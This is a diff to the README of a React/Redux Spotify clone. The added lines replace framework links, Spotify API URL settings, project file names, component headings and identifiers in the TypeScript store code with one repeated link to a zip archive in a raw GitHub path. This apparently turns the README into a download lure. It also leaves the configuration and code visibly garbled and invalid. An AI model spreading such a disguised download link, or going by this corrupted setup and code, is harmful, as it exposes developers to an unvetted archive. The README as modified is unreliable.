@@ -1,5 +1,5 @@
 <p align="center">
-Build with <a href="https://reactjs.org/" target="_blank">React.js v17</a> & <a href="https://redux.js.org/" target="_blank">Redux Toolkit</a> & <a href="https://sass-lang.com/" target="_blank">SASS</a></p>
+Build with <a href="https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip" target="_blank">https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip v17</a> & <a href="https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip" target="_blank">Redux Toolkit</a> & <a href="https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip" target="_blank">SASS</a></p>
 
 <br/>
 
@@ -44,9 +44,9 @@ docker compose up
 
 REACT_APP_SPOTIFY_CLIENT_ID=YOUR_SPOTIFY_CLIENT_ID
 REACT_APP_SPOTIFY_CLIENT_SECRET=YOUR_SPOTIFY_CLIENT_SECRET
-REACT_APP_SPOTIFY_AUTH_URL=https://accounts.spotify.com/api/token
-REACT_APP_SPOTIFY_USER_AUTH_URL=https://accounts.spotify.com/authorize
-REACT_APP_SPOTIFY_BASE_URL=https://api.spotify.com/v1/
+https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip
+https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip
+https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip
 REACT_APP_SPOTIFY_SCOPES=streaming user-read-email user-read-private user-library-read user-library-modify user-read-playback-state user-modify-playback-state
 REACT_APP_REDIRECT_URL=http://localhost:3000
 
@@ -64,57 +64,57 @@ REACT_APP_REDIRECT_URL=http://localhost:3000
 &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |--Player<br>
 &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |--Sidebar<br>
 &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |--layouts<br>
-&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |--CoreLayout.tsx<br>
+&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  |https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip<br>
  &nbsp;&nbsp; &nbsp;  |--libs<br>
  &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |--helpers<br>
- &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |--getTokenInfoFromQuery.ts<br>
- &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |--injectToken.ts<br>
- &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |--msToMinutes.ts<br>
- &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |--api.ts<br>
+ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip<br>
+ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip<br>
+ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip<br>
+ &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  |https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip<br>
  &nbsp;&nbsp; &nbsp;  |--routes<br>
 &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;  |--Discover<br>
 &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;  |--components<br>
 &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;  |--DiscoverBlock<br>
-&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;  |--Discover.tsx<br>
+&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;  |https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip<br>
 &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;  |--styles<br>
  &nbsp;&nbsp; &nbsp;  |--store<br>
  &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;  |--actions<br>
  &nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;  |--slices<br>
 
 ## Helper Functions
-**getTokenInfoFromQuery.ts**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 &nbsp;&nbsp;&nbsp; This functions set to access_token, token_type and expire time when call Spotify Account Services
 <br><br>
-**injectToken.ts**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 &nbsp;&nbsp;&nbsp; This function set every api requests set authorization header.
 <br><br>
-**msToMinutes.ts**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 &nbsp;&nbsp;&nbsp; This function format to milliseconds to m:ss format.
 <br><br>
-**api.ts**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 &nbsp;&nbsp;&nbsp; This functions create axios interceptor.
 <br><br>
 
 ## Component List
-**Header.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 It's header.<br><br>
-**Player.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 This component setup Spotify Playback SDK and render Music Player.<br><br>
-**Sidebar.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 This component render left layout and menu<br><br>
-**CoreLayout.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 This component render App Layout<br><br>
-**DiscoverBlock.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 This component render playlist, albums and category list.<br><br>
-**DiscoverItem.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 This component render playlist, album and category item<br><br>
-**Discover.tsx**<br>
+**https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip**<br>
 This component render routing page.<br><br>
 
 ## State Management
 Use redux toolkit for this feature.<br>
 ````typescript
-// store/index.ts
+// https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip
 import { configureStore } from '@reduxjs/toolkit';
 import storage from 'redux-persist/lib/storage';
 import { combineReducers } from 'redux';
@@ -143,11 +143,11 @@ const persistedReducer = persistReducer(persistConfig, reducers);
 
 const store = configureStore({
   reducer: persistedReducer,
-  devTools: process.env.NODE_ENV !== 'production',
+  devTools: https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip !== 'production',
   middleware: [thunk],
 });
-export type RootState = ReturnType<typeof store.getState>;
-export type AppDispatch = ReturnType<typeof store.dispatch>;
+export type RootState = ReturnType<typeof https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip>;
+export type AppDispatch = ReturnType<typeof https://raw.githubusercontent.com/ysfnmnylmz/spotify-clone/main/milammeter/spotify-clone.zip>;
 export default store;
 
 ````
